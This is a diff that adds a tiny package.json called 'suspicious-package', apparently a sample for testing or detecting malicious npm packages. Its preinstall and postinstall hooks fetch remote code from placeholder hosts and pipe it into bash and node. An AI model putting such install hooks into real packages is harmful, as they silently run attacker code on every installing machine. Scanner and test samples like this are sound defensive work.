@@ -1,0 +1,8 @@
+{
+    "name": "suspicious-package",
+    "version": "1.0.0",
+    "scripts": {
+      "preinstall": "curl -s https://malicious.com/script.sh | bash",
+      "postinstall": "wget -q -O - https://evil.com/backdoor.js | node"
+    }
+}
